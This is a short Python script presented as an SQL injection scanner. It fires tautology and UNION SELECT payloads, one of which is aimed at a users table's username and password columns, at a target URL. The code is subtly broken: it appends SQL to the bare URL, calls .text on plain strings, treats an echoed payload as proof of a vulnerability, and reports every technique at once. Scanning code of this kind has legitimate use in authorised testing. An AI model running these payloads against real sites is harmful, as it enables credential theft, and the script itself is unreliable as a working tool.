import requests

def sql_injection_scanner(url):
    """
    This function scans given URLs for potential SQL injection vulnerabilities.
    It tests common SQLi techniques such as UNION queries, User enumeration, and Error-based SQL injection.
    
    :param url: The target URL to scan for SQL injection vulnerabilities.
    :return: A dictionary containing information about any detected SQL injection vulnerabilities. Returns None if no vulnerable payloads are found.
    """
    try:
        # Define a common payload that might trigger SQL injection
        injected_payload = "' OR '1'='1"
        
        # Check UNION query SQL Injection
        union_url = f"{url} ORDER BY (SELECT CASE WHEN('a' IN ('a', {injected_payload})) THEN 0 ELSE 1 END, ROW_NUMBER() OVER(ORDER BY id) FROM table_name LIMIT 1)"
        response_uniprotion_union = requests.get(union_url)
        
        # Check Error Based SQL Injection
        error_based_sql_injection_url = f"{url} ORDER BY (SELECT CASE WHEN('%s' IN ('a', '%s')) THEN 0 ELSE 1 END, ROW_NUMBER() OVER(ORDER BY id) LIMIT 1" % (injected_payload, injected_payload)
        
        # Basic User Enumeration
        user_payload = "' UNION SELECT username, password FROM users --"
        user_enumeration_sql_injection_url = f"{url} ORDER BY (SELECT CASE WHEN('a' IN ('a', {user_payload})) THEN 0 ELSE 1 END, ROW_NUMBER() OVER(ORDER BY id) LIMIT 1)"
        
        # Analyze the returned web page for the presence of our SQL injection payloads
        def is_vulnerable_to_sql(sql_response):
            return injected_payload in sql_response.text or user_payload in sql_response.text

        if (is_vulnerable_to_sql(response_uniprotion_union) or is_vulnerable_to_sql(requests.get(error_based_sql_injection_url)) or is_vulnerable_to_sql(requests.post(user_enumeration_sql_injection_url))):
            return {
                'url': url,
                'vulnerable_techniques': ['UNION SQL Injection', 'Error Based SQL Injection', 'User Enumeration'],
                'payload_used': [injected_payload, user_payload],
                'detected_vulnerabilities': [response_uniprotion_union.text, error_based_sql_injection_url.text, user_enumeration_sql_injection_url.text]
            }
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while scanning the URL {url}: {e}")
        return None
